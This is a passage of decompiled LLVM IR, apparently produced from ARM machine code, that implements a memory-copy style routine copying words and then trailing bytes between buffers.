  %v3_17730 = sub i32 27, %v0_17728
  %v4_17730 = and i32 %v3_17730, %v1_17728
  %v5_17730 = icmp slt i32 %v4_17730, 0
  store i1 %v5_17730, i1* %cpsr_v.global-to-local, align 1
  %v6_17730 = icmp slt i32 %v1_17730, 0
  store i1 %v6_17730, i1* %cpsr_n.global-to-local, align 1
  %v7_17730 = icmp eq i32 %v1_17728, 20
  store i1 %v7_17730, i1* %cpsr_z.global-to-local, align 1
  %v2_17734 = xor i1 %v6_17730, %v5_17730
  br i1 %v2_17734, label %dec_label_pc_17768, label %dec_label_pc_17738

dec_label_pc_17738:                               ; preds = %dec_label_pc_17730
  %v0_17738 = load i32, i32* @r4, align 4
  store i32 %v0_17738, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1773c

dec_label_pc_1773c:                               ; preds = %dec_label_pc_1773c.dec_label_pc_1773c_crit_edge, %dec_label_pc_17738
  %v0_17740 = phi i32 [ %v12_17748, %dec_label_pc_1773c.dec_label_pc_1773c_crit_edge ], [ %v0_1774094, %dec_label_pc_17738 ]
  %v0_1773c = phi i32 [ %v0_1773c.pre, %dec_label_pc_1773c.dec_label_pc_1773c_crit_edge ], [ %v0_1773c93, %dec_label_pc_17738 ]
  %v1_1773c = inttoptr i32 %v0_1773c to i32*
  %v2_1773c = load i32, i32* %v1_1773c, align 4
  %v3_1773c = add i32 %v0_1773c, 4
  %v4_1773c = inttoptr i32 %v3_1773c to i32*
  %v5_1773c = load i32, i32* %v4_1773c, align 4
  store i32 %v5_1773c, i32* %r4.global-to-local, align 4
  %v6_1773c = add i32 %v0_1773c, 8
  %v7_1773c = inttoptr i32 %v6_1773c to i32*
  %v8_1773c = load i32, i32* %v7_1773c, align 4
  store i32 %v8_1773c, i32* %ip.global-to-local, align 4
  %v9_1773c = add i32 %v0_1773c, 12
  %v10_1773c = inttoptr i32 %v9_1773c to i32*
  %v11_1773c = load i32, i32* %v10_1773c, align 4
  store i32 %v11_1773c, i32* %lr.global-to-local, align 4
  %v12_1773c = add i32 %v0_1773c, 16
  store i32 %v12_1773c, i32* %r1.global-to-local, align 4
  %v1_17740 = inttoptr i32 %v0_17740 to i32*
  store i32 %v2_1773c, i32* %v1_17740, align 4
  %v3_17740 = add i32 %v0_17740, 4
  %v4_17740 = inttoptr i32 %v3_17740 to i32*
  %v5_17740 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17740, i32* %v4_17740, align 4
  %v6_17740 = add i32 %v0_17740, 8
  %v7_17740 = inttoptr i32 %v6_17740 to i32*
  %v8_17740 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_17740, i32* %v7_17740, align 4
  %v9_17740 = add i32 %v0_17740, 12
  %v10_17740 = inttoptr i32 %v9_17740 to i32*
  %v11_17740 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17740, i32* %v10_17740, align 4
  %v12_17740 = add i32 %v0_17740, 16
  store i32 %v12_17740, i32* %r0.global-to-local, align 4
  %v0_17744 = load i32, i32* %r1.global-to-local, align 4
  %v1_17744 = inttoptr i32 %v0_17744 to i32*
  %v2_17744 = load i32, i32* %v1_17744, align 4
  store i32 %v2_17744, i32* @r3, align 4
  %v3_17744 = add i32 %v0_17744, 4
  %v4_17744 = inttoptr i32 %v3_17744 to i32*
  %v5_17744 = load i32, i32* %v4_17744, align 4
  store i32 %v5_17744, i32* %r4.global-to-local, align 4
  %v6_17744 = add i32 %v0_17744, 8
  %v7_17744 = inttoptr i32 %v6_17744 to i32*
  %v8_17744 = load i32, i32* %v7_17744, align 4
  store i32 %v8_17744, i32* @ip, align 4
  %v9_17744 = add i32 %v0_17744, 12
  %v10_17744 = inttoptr i32 %v9_17744 to i32*
  %v11_17744 = load i32, i32* %v10_17744, align 4
  store i32 %v11_17744, i32* %lr.global-to-local, align 4
  %v12_17744 = add i32 %v0_17744, 16
  store i32 %v12_17744, i32* @r1, align 4
  %v1_17748 = inttoptr i32 %v12_17740 to i32*
  store i32 %v2_17744, i32* %v1_17748, align 4
  %v3_17748 = add i32 %v0_17740, 20
  %v4_17748 = inttoptr i32 %v3_17748 to i32*
  %v5_17748 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17748, i32* %v4_17748, align 4
  %v6_17748 = add i32 %v0_17740, 24
  %v7_17748 = inttoptr i32 %v6_17748 to i32*
  %v8_17748 = load i32, i32* @ip, align 4
  store i32 %v8_17748, i32* %v7_17748, align 4
  %v9_17748 = add i32 %v0_17740, 28
  %v10_17748 = inttoptr i32 %v9_17748 to i32*
  %v11_17748 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17748, i32* %v10_17748, align 4
  %v12_17748 = add i32 %v0_17740, 32
  store i32 %v12_17748, i32* @r0, align 4
  %v0_1774c = load i32, i32* %r2.global-to-local, align 4
  %v1_1774c = add i32 %v0_1774c, -32
  store i32 %v1_1774c, i32* %r2.global-to-local, align 4
  %v3_1774c = sub i32 31, %v0_1774c
  %v4_1774c = and i32 %v3_1774c, %v0_1774c
  %v5_1774c = icmp slt i32 %v4_1774c, 0
  %v6_1774c = icmp slt i32 %v1_1774c, 0
  %v2_17750 = xor i1 %v6_1774c, %v5_1774c
  br i1 %v2_17750, label %dec_label_pc_17754, label %dec_label_pc_1773c.dec_label_pc_1773c_crit_edge

dec_label_pc_1773c.dec_label_pc_1773c_crit_edge:  ; preds = %dec_label_pc_1773c
  %v0_1773c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1773c

dec_label_pc_17754:                               ; preds = %dec_label_pc_1773c
  %v1_17754 = add i32 %v0_1774c, -16
  %v3_17754 = add i32 %v0_1774c, 2147483616
  %v4_17754 = and i32 %v1_17754, %v3_17754
  %v5_17754 = icmp slt i32 %v4_17754, 0
  store i1 %v5_17754, i1* %cpsr_v.global-to-local, align 1
  %v6_17754 = icmp slt i32 %v1_17754, 0
  store i1 %v6_17754, i1* %cpsr_n.global-to-local, align 1
  %v7_17754 = icmp eq i32 %v1_17754, 0
  store i1 %v7_17754, i1* %cpsr_z.global-to-local, align 1
  %v2_17758 = xor i1 %v6_17754, %v5_17754
  br i1 %v2_17758, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_17754
  %v3_17758 = load i32, i32* @r1, align 4
  %v4_17758 = inttoptr i32 %v3_17758 to i32*
  %v5_17758 = load i32, i32* %v4_17758, align 4
  store i32 %v5_17758, i32* @r3, align 4
  %v6_17758 = add i32 %v3_17758, 4
  %v7_17758 = inttoptr i32 %v6_17758 to i32*
  %v8_17758 = load i32, i32* %v7_17758, align 4
  store i32 %v8_17758, i32* %r4.global-to-local, align 4
  %v9_17758 = add i32 %v3_17758, 8
  %v10_17758 = inttoptr i32 %v9_17758 to i32*
  %v11_17758 = load i32, i32* %v10_17758, align 4
  store i32 %v11_17758, i32* @ip, align 4
  %v12_17758 = add i32 %v3_17758, 12
  %v13_17758 = inttoptr i32 %v12_17758 to i32*
  %v14_17758 = load i32, i32* %v13_17758, align 4
  store i32 %v14_17758, i32* %lr.global-to-local, align 4
  %v15_17758 = add i32 %v3_17758, 16
  store i32 %v15_17758, i32* @r1, align 4
  %v4_1775c = inttoptr i32 %v12_17748 to i32*
  store i32 %v5_17758, i32* %v4_1775c, align 4
  %v6_1775c = add i32 %v0_17740, 36
  %v7_1775c = inttoptr i32 %v6_1775c to i32*
  %v8_1775c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1775c, i32* %v7_1775c, align 4
  %v9_1775c = add i32 %v0_17740, 40
  %v10_1775c = inttoptr i32 %v9_1775c to i32*
  %v11_1775c = load i32, i32* @ip, align 4
  store i32 %v11_1775c, i32* %v10_1775c, align 4
  %v12_1775c = add i32 %v0_17740, 44
  %v13_1775c = inttoptr i32 %v12_1775c to i32*
  %v14_1775c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1775c, i32* %v13_1775c, align 4
  %v15_1775c = add i32 %v0_17740, 48
  store i32 %v15_1775c, i32* @r0, align 4
  %v3_17760 = load i32, i32* %r2.global-to-local, align 4
  %v4_17760 = add i32 %v3_17760, -16
  store i32 %v4_17760, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_17754, %bb136
  %v3_17770102111 = phi i32 [ %v15_1775c, %bb136 ], [ %v12_17748, %dec_label_pc_17754 ]
  %v0_17768.pre = phi i32 [ %v4_17760, %bb136 ], [ %v1_1774c, %dec_label_pc_17754 ]
  %v2_17764 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17764, i32* @r4, align 4
  br label %dec_label_pc_17768

dec_label_pc_17768:                               ; preds = %dec_label_pc_17730, %bb137
  %v3_17770101 = phi i32 [ %v0_1774094, %dec_label_pc_17730 ], [ %v3_17770102111, %bb137 ]
  %v0_17768 = phi i32 [ %v1_17730, %dec_label_pc_17730 ], [ %v0_17768.pre, %bb137 ]
  %v1_17768 = add i32 %v0_17768, 20
  store i32 %v1_17768, i32* %r2.global-to-local, align 4
  %v3_17768 = sub i32 0, %v0_17768
  %v4_17768 = and i32 %v1_17768, %v3_17768
  %v5_17768 = icmp slt i32 %v4_17768, 0
  store i1 %v5_17768, i1* %cpsr_v.global-to-local, align 1
  %v6_17768 = icmp slt i32 %v1_17768, 0
  store i1 %v6_17768, i1* %cpsr_n.global-to-local, align 1
  %v7_17768 = icmp eq i32 %v1_17768, 0
  store i1 %v7_17768, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1776c

dec_label_pc_1776c:                               ; preds = %.thread115, %dec_label_pc_17768
  %v0_1777c.pre157 = phi i32 [ %v0_1777c.pre, %.thread115 ], [ %v1_17768, %dec_label_pc_17768 ]
  %v3_17770 = phi i32 [ %v3_1777099116, %.thread115 ], [ %v3_17770101, %dec_label_pc_17768 ]
  %v1_17774 = phi i1 [ %v1_17778, %.thread115 ], [ %v5_17768, %dec_label_pc_17768 ]
  %v0_17774 = phi i1 [ %v0_17778, %.thread115 ], [ %v6_17768, %dec_label_pc_17768 ]
  %v2_1776c = xor i1 %v1_17774, %v0_17774
  br i1 %v2_1776c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1776c
  %v3_1776c = load i32, i32* @r1, align 4
  %v4_1776c = inttoptr i32 %v3_1776c to i32*
  %v5_1776c = load i32, i32* %v4_1776c, align 4
  store i32 %v5_1776c, i32* @r3, align 4
  %v6_1776c = add i32 %v3_1776c, 4
  %v7_1776c = inttoptr i32 %v6_1776c to i32*
  %v8_1776c = load i32, i32* %v7_1776c, align 4
  store i32 %v8_1776c, i32* @ip, align 4
  %v9_1776c = add i32 %v3_1776c, 8
  %v10_1776c = inttoptr i32 %v9_1776c to i32*
  %v11_1776c = load i32, i32* %v10_1776c, align 4
  store i32 %v11_1776c, i32* %lr.global-to-local, align 4
  %v12_1776c = add i32 %v3_1776c, 12
  store i32 %v12_1776c, i32* @r1, align 4
  %v4_17770 = inttoptr i32 %v3_17770 to i32*
  store i32 %v5_1776c, i32* %v4_17770, align 4
  %v6_17770 = add i32 %v3_17770, 4
  %v7_17770 = inttoptr i32 %v6_17770 to i32*
  %v8_17770 = load i32, i32* @ip, align 4
  store i32 %v8_17770, i32* %v7_17770, align 4
  %v9_17770 = add i32 %v3_17770, 8
  %v10_17770 = inttoptr i32 %v9_17770 to i32*
  %v11_17770 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17770, i32* %v10_17770, align 4
  %v12_17770 = add i32 %v3_17770, 12
  store i32 %v12_17770, i32* @r0, align 4
  %v3_17774 = load i32, i32* %r2.global-to-local, align 4
  %v4_17774 = add i32 %v3_17774, -12
  store i32 %v4_17774, i32* %r2.global-to-local, align 4
  %v6_17774 = sub i32 11, %v3_17774
  %v7_17774 = and i32 %v6_17774, %v3_17774
  %v8_17774 = icmp slt i32 %v7_17774, 0
  store i1 %v8_17774, i1* %cpsr_v.global-to-local, align 1
  %v9_17774 = icmp slt i32 %v4_17774, 0
  store i1 %v9_17774, i1* %cpsr_n.global-to-local, align 1
  %v10_17774 = icmp eq i32 %v3_17774, 12
  store i1 %v10_17774, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1776c, %bb138
  %v0_1777c.pre = phi i32 [ %v4_17774, %bb138 ], [ %v0_1777c.pre157, %dec_label_pc_1776c ]
  %v3_1777099116 = phi i32 [ %v12_17770, %bb138 ], [ %v3_17770, %dec_label_pc_1776c ]
  %v1_17778 = phi i1 [ %v8_17774, %bb138 ], [ %v1_17774, %dec_label_pc_1776c ]
  %v0_17778 = phi i1 [ %v9_17774, %bb138 ], [ %v0_17774, %dec_label_pc_1776c ]
  %v2_17778 = xor i1 %v1_17778, %v0_17778
  br i1 %v2_17778, label %dec_label_pc_1777c, label %dec_label_pc_1776c

dec_label_pc_1777c:                               ; preds = %.thread115, %dec_label_pc_17728
  %v4_1778c = phi i32 [ %v0_1774094, %dec_label_pc_17728 ], [ %v3_1777099116, %.thread115 ]
  %v0_1777c = phi i32 [ %v1_17728, %dec_label_pc_17728 ], [ %v0_1777c.pre, %.thread115 ]
  %v1_1777c = add i32 %v0_1777c, 8
  store i32 %v1_1777c, i32* %r2.global-to-local, align 4
  %v3_1777c = sub i32 0, %v0_1777c
  %v4_1777c = and i32 %v1_1777c, %v3_1777c
  %v5_1777c = icmp slt i32 %v4_1777c, 0
  store i1 %v5_1777c, i1* %cpsr_v.global-to-local, align 1
  %v6_1777c = icmp slt i32 %v1_1777c, 0
  store i1 %v6_1777c, i1* %cpsr_n.global-to-local, align 1
  %v7_1777c = icmp eq i32 %v1_1777c, 0
  store i1 %v7_1777c, i1* %cpsr_z.global-to-local, align 1
  %v2_17780 = xor i1 %v6_1777c, %v5_1777c
  br i1 %v2_17780, label %bb140, label %dec_label_pc_17784

dec_label_pc_17784:                               ; preds = %dec_label_pc_1777c
  %v1_17784 = add i32 %v0_1777c, 4
  store i32 %v1_17784, i32* %r2.global-to-local, align 4
  %v3_17784 = sub i32 -5, %v0_1777c
  %v4_17784 = and i32 %v3_17784, %v1_1777c
  %v5_17784 = icmp slt i32 %v4_17784, 0
  store i1 %v5_17784, i1* %cpsr_v.global-to-local, align 1
  %v6_17784 = icmp slt i32 %v1_17784, 0
  store i1 %v6_17784, i1* %cpsr_n.global-to-local, align 1
  %v7_17784 = icmp eq i32 %v1_1777c, 4
  store i1 %v7_17784, i1* %cpsr_z.global-to-local, align 1
  %v2_17788 = xor i1 %v6_17784, %v5_17784
  %v3_17788 = load i32, i32* @r1, align 4
  %v4_17788 = inttoptr i32 %v3_17788 to i32*
  %v5_17788 = load i32, i32* %v4_17788, align 4
  store i32 %v5_17788, i32* @r3, align 4
  %v7_17788 = add i32 %v3_17788, 4
  br i1 %v2_17788, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_17784
  store i32 %v7_17788, i32* @r1, align 4
  %v5_1778c = inttoptr i32 %v4_1778c to i32*
  store i32 %v5_17788, i32* %v5_1778c, align 4
  %v6_1778c = load i32, i32* @r0, align 4
  %v7_1778c = add i32 %v6_1778c, 4
  store i32 %v7_1778c, i32* @r0, align 4
  %v0_1779c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_17784
  %v7_17790 = inttoptr i32 %v7_17788 to i32*
  %v8_17790 = load i32, i32* %v7_17790, align 4
  store i32 %v8_17790, i32* @ip, align 4
  %v9_17790 = add i32 %v3_17788, 8
  store i32 %v9_17790, i32* @r1, align 4
  %v4_17794 = inttoptr i32 %v4_1778c to i32*
  store i32 %v5_17788, i32* %v4_17794, align 4
  %v6_17794 = add i32 %v4_1778c, 4
  %v7_17794 = inttoptr i32 %v6_17794 to i32*
  %v8_17794 = load i32, i32* @ip, align 4
  store i32 %v8_17794, i32* %v7_17794, align 4
  %v9_17794 = add i32 %v4_1778c, 8
  store i32 %v9_17794, i32* @r0, align 4
  %v3_17798 = load i32, i32* %r2.global-to-local, align 4
  %v4_17798 = add i32 %v3_17798, -4
  store i32 %v4_17798, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1777c, %bb, %dec_label_pc_1794c, %dec_label_pc_178e0, %dec_label_pc_17874, %bb139
  %v0_1779c = phi i32 [ %v0_1779c.pre, %.thread122 ], [ %v2_177ec, %.thread128 ], [ %v1_1777c, %dec_label_pc_1777c ], [ %v2_17710, %bb ], [ %v0_1779c61, %dec_label_pc_1794c ], [ %v0_1779c60, %dec_label_pc_178e0 ], [ %v0_1779c59, %dec_label_pc_17874 ], [ %v4_17798, %bb139 ]
  %v1_1779c = add i32 %v0_1779c, 4
  store i32 %v1_1779c, i32* %r2.global-to-local, align 4
  %v3_1779c = sub i32 0, %v0_1779c
  %v4_1779c = and i32 %v1_1779c, %v3_1779c
  %v5_1779c = icmp slt i32 %v4_1779c, 0
  store i1 %v5_1779c, i1* %cpsr_v.global-to-local, align 1
  %v6_1779c = icmp slt i32 %v1_1779c, 0
  store i1 %v6_1779c, i1* %cpsr_n.global-to-local, align 1
  %v7_1779c = icmp eq i32 %v1_1779c, 0
  store i1 %v7_1779c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1779c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_177a4.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_177a0 = load i8*, i8** %stack_var_-8, align 4
  %v4_177a0 = ptrtoint i8* %v3_177a0 to i32
  store i32 %v4_177a0, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_177a4 = phi i32 [ %v0_177a4.pre, %bb140.bb142_crit_edge ], [ %v8_1770c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1779c, i32 %v0_177a4)
  %v0_177a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_177a8 = add i32 %v0_177a8, -2
  %v3_177a8 = sub i32 1, %v0_177a8
  %v4_177a8 = and i32 %v3_177a8, %v0_177a8
  %v5_177a8 = icmp slt i32 %v4_177a8, 0
  store i1 %v5_177a8, i1* %cpsr_v.global-to-local, align 1
  %v6_177a8 = icmp slt i32 %v1_177a8, 0
  store i1 %v6_177a8, i1* %cpsr_n.global-to-local, align 1
  %v7_177a8 = icmp eq i32 %v0_177a8, 2
  store i1 %v7_177a8, i1* %cpsr_z.global-to-local, align 1
  %v0_177ac = load i32, i32* @r1, align 4
  %v1_177ac = inttoptr i32 %v0_177ac to i8*
  %v2_177ac = load i8, i8* %v1_177ac, align 1
  %v5_177ac = add i32 %v0_177ac, 1
  store i32 %v5_177ac, i32* %r1.global-to-local, align 4
  %v2_177b0 = load i32, i32* @r0, align 4
  %v3_177b0 = inttoptr i32 %v2_177b0 to i8*
  store i8 %v2_177ac, i8* %v3_177b0, align 1
  %v4_177b0 = load i32, i32* @r0, align 4
  %v5_177b0 = add i32 %v4_177b0, 1
  store i32 %v5_177b0, i32* %r0.global-to-local, align 4
  %v0_177b4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_177b4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_177b4 = xor i1 %v0_177b4, %v1_177b4
  br i1 %v2_177b4, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_177b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_177b4 = inttoptr i32 %v3_177b4 to i8*
  %v5_177b4 = load i8, i8* %v4_177b4, align 1
  %v8_177b4 = add i32 %v3_177b4, 1
  store i32 %v8_177b4, i32* %r1.global-to-local, align 4
  %v6_177b8 = inttoptr i32 %v5_177b0 to i8*
  store i8 %v5_177b4, i8* %v6_177b8, align 1
  %v7_177b8 = load i32, i32* %r0.global-to-local, align 4
  %v8_177b8 = add i32 %v7_177b8, 1
  store i32 %v8_177b8, i32* %r0.global-to-local, align 4
  %v1_177bc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_177bc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_177c0 = phi i32 [ %v8_177b8, %bb143 ], [ %v5_177b0, %bb142 ]
  %v2_177c0 = phi i1 [ %v2_177bc.pre, %bb143 ], [ %v1_177b4, %bb142 ]
  %v1_177c0 = phi i1 [ %v1_177bc.pre, %bb143 ], [ %v0_177b4, %bb142 ]
  %v0_177bc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_177bc = xor i1 %v2_177c0, %v1_177c0
  %v4_177bc = or i1 %v0_177bc, %v3_177bc
  br i1 %v4_177bc, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_177bc = load i32, i32* %r1.global-to-local, align 4
  %v6_177bc = inttoptr i32 %v5_177bc to i8*
  %v7_177bc = load i8, i8* %v6_177bc, align 1
  %v10_177bc = add i32 %v5_177bc, 1
  store i32 %v10_177bc, i32* %r1.global-to-local, align 4
  %v8_177c0 = inttoptr i32 %v7_177c0 to i8*
  store i8 %v7_177bc, i8* %v8_177c0, align 1
  %v9_177c0 = load i32, i32* %r0.global-to-local, align 4
  %v10_177c0 = add i32 %v9_177c0, 1
  store i32 %v10_177c0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_177c4 = load i8*, i8** %stack_var_-8, align 4
  %v3_177c4 = ptrtoint i8* %v2_177c4 to i32
  store i32 %v3_177c4, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1770c)
  %v0_177cc.pre = load i32, i32* @ip, align 4
  %v0_177d4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_177d8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_177cc

dec_label_pc_177cc:                               ; preds = %dec_label_pc_17718, %.thread126
  %v2_177d8 = phi i32 [ %v1_17700, %dec_label_pc_17718 ], [ %v2_177d8.pre, %.thread126 ]
  %v0_177d4 = phi i32 [ %v0_17700, %dec_label_pc_17718 ], [ %v0_177d4.pre, %.thread126 ]
  %v0_177cc = phi i32 [ %v1_17718, %dec_label_pc_17718 ], [ %v0_177cc.pre, %.thread126 ]
  %v1_177cc = sub i32 4, %v0_177cc
  store i32 %v1_177cc, i32* @ip, align 4
  %v1_177d0 = add i32 %v1_177cc, -2
  %v3_177d0 = sub i32 1, %v1_177cc
  %v4_177d0 = and i32 %v3_177d0, %v1_177cc
  %v5_177d0 = icmp slt i32 %v4_177d0, 0
  store i1 %v5_177d0, i1* %cpsr_v.global-to-local, align 1
  %v6_177d0 = icmp slt i32 %v1_177d0, 0
  store i1 %v6_177d0, i1* %cpsr_n.global-to-local, align 1
  %v7_177d0 = icmp eq i32 %v1_177cc, 2
  store i1 %v7_177d0, i1* %cpsr_z.global-to-local, align 1
  %v1_177d4 = inttoptr i32 %v0_177d4 to i8*
  %v2_177d4 = load i8, i8* %v1_177d4, align 1
  %v3_177d4 = zext i8 %v2_177d4 to i32
  store i32 %v3_177d4, i32* @r3, align 4
  %v5_177d4 = add i32 %v0_177d4, 1
  store i32 %v5_177d4, i32* @r1, align 4
  %v3_177d8 = inttoptr i32 %v2_177d8 to i8*
  store i8 %v2_177d4, i8* %v3_177d8, align 1
  %v4_177d8 = load i32, i32* @r0, align 4
  %v5_177d8 = add i32 %v4_177d8, 1
  store i32 %v5_177d8, i32* @r0, align 4
  %v0_177dc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_177dc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_177dc = xor i1 %v0_177dc, %v1_177dc
  br i1 %v2_177dc, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_177cc
  %v3_177dc = load i32, i32* @r1, align 4
  %v4_177dc = inttoptr i32 %v3_177dc to i8*
  %v5_177dc = load i8, i8* %v4_177dc, align 1
  %v6_177dc = zext i8 %v5_177dc to i32
  store i32 %v6_177dc, i32* @r3, align 4
  %v8_177dc = add i32 %v3_177dc, 1
  store i32 %v8_177dc, i32* @r1, align 4
  %v6_177e0 = inttoptr i32 %v5_177d8 to i8*
  store i8 %v5_177dc, i8* %v6_177e0, align 1
  %v7_177e0 = load i32, i32* @r0, align 4
  %v8_177e0 = add i32 %v7_177e0, 1
  store i32 %v8_177e0, i32* @r0, align 4
  %v1_177e4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_177e4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_177cc, %bb145
  %v7_177e8 = phi i32 [ %v8_177e0, %bb145 ], [ %v5_177d8, %dec_label_pc_177cc ]
  %v2_177e8 = phi i1 [ %v2_177e4.pre, %bb145 ], [ %v1_177dc, %dec_label_pc_177cc ]
  %v1_177e8 = phi i1 [ %v1_177e4.pre, %bb145 ], [ %v0_177dc, %dec_label_pc_177cc ]
  %v0_177e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_177e4 = xor i1 %v2_177e8, %v1_177e8
  %v4_177e4 = or i1 %v0_177e4, %v3_177e4
  br i1 %v4_177e4, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_177e4 = load i32, i32* @r1, align 4
  %v6_177e4 = inttoptr i32 %v5_177e4 to i8*
  %v7_177e4 = load i8, i8* %v6_177e4, align 1
  %v8_177e4 = zext i8 %v7_177e4 to i32
  store i32 %v8_177e4, i32* @r3, align 4
  %v10_177e4 = add i32 %v5_177e4, 1
  store i32 %v10_177e4, i32* @r1, align 4
  %v8_177e8 = inttoptr i32 %v7_177e8 to i8*
  store i8 %v7_177e4, i8* %v8_177e8, align 1
  %v9_177e8 = load i32, i32* @r0, align 4
  %v10_177e8 = add i32 %v9_177e8, 1
  store i32 %v10_177e8, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_1791c77 = phi i32 [ %v10_177e8, %bb146 ], [ %v7_177e8, %.thread127 ]
  %v0_177ec = load i32, i32* %r2.global-to-local, align 4
  %v1_177ec = load i32, i32* @ip, align 4
  %v2_177ec = sub i32 %v0_177ec, %v1_177ec
  store i32 %v2_177ec, i32* %r2.global-to-local, align 4
  %v4_177ec = xor i32 %v1_177ec, %v0_177ec
  %v5_177ec = xor i32 %v2_177ec, %v0_177ec
  %v6_177ec = and i32 %v5_177ec, %v4_177ec
  %v7_177ec = icmp slt i32 %v6_177ec, 0
  store i1 %v7_177ec, i1* %cpsr_v.global-to-local, align 1
  %v8_177ec = icmp slt i32 %v2_177ec, 0
  store i1 %v8_177ec, i1* %cpsr_n.global-to-local, align 1
  %v9_177ec = icmp eq i32 %v0_177ec, %v1_177ec
  store i1 %v9_177ec, i1* %cpsr_z.global-to-local, align 1
  %v2_177f0 = xor i1 %v8_177ec, %v7_177ec
  br i1 %v2_177f0, label %bb140, label %dec_label_pc_177f4

dec_label_pc_177f4:                               ; preds = %.thread128
  %v0_177f4 = load i32, i32* @r1, align 4
  %v1_177f4 = urem i32 %v0_177f4, 4
  store i32 %v1_177f4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_177f4 = icmp eq i32 %v1_177f4, 0
  store i1 %v2_177f4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_177f4 to i2
  br i1 %v2_177f4, label %dec_label_pc_17728, label %dec_label_pc_177fc

dec_label_pc_177fc:                               ; preds = %dec_label_pc_17720, %dec_label_pc_177f4
  %v0_1791c76 = phi i32 [ %v1_17700, %dec_label_pc_17720 ], [ %v0_1791c77, %dec_label_pc_177f4 ]
  %v0_17884 = phi i32 [ %v2_17710, %dec_label_pc_17720 ], [ %v2_177ec, %dec_label_pc_177f4 ]
  %v0_17804.off0 = phi i2 [ %extract.t, %dec_label_pc_17720 ], [ %extract.t131, %dec_label_pc_177f4 ]
  %v0_177fc = phi i32 [ %v0_17700, %dec_label_pc_17720 ], [ %v0_177f4, %dec_label_pc_177f4 ]
  %v1_177fc = and i32 %v0_177fc, -4
  store i32 %v1_177fc, i32* %r1.global-to-local, align 4
  %v1_17800 = inttoptr i32 %v1_177fc to i32*
  %v2_17800 = load i32, i32* %v1_17800, align 4
  store i32 %v2_17800, i32* %lr.global-to-local, align 4
  %v4_17800 = add i32 %v1_177fc, 4
  store i32 %v4_17800, i32* %r1.global-to-local, align 4
  %v1_1787c = add i32 %v0_17884, -12
  %v3_1787c = sub i32 11, %v0_17884
  %v4_1787c = and i32 %v3_1787c, %v0_17884
  %v5_1787c = icmp slt i32 %v4_1787c, 0
  store i1 %v5_1787c, i1* %cpsr_v.global-to-local, align 1
  %v6_1787c = icmp slt i32 %v1_1787c, 0
  store i1 %v6_1787c, i1* %cpsr_n.global-to-local, align 1
  %v7_1787c = icmp eq i32 %v0_17884, 12
  store i1 %v7_1787c, i1* %cpsr_z.global-to-local, align 1
  %v2_17880 = xor i1 %v6_1787c, %v5_1787c
  switch i2 %v0_17804.off0, label %dec_label_pc_17810 [
    i2 -1, label %dec_label_pc_178e8
    i2 -2, label %dec_label_pc_1787c
  ]

dec_label_pc_17810:                               ; preds = %dec_label_pc_177fc
  br i1 %v2_17880, label %dec_label_pc_1785c, label %dec_label_pc_17818

dec_label_pc_17818:                               ; preds = %dec_label_pc_17810
  store i32 %v1_1787c, i32* %r2.global-to-local, align 4
  %v3_1781c = load i32, i32* @r4, align 4
  store i32 %v3_1781c, i32* %stack_var_-16, align 4
  %v6_1781c = load i32, i32* @r5, align 4
  store i32 %v6_1781c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17820

dec_label_pc_17820:                               ; preds = %dec_label_pc_17820.dec_label_pc_17820_crit_edge, %dec_label_pc_17818
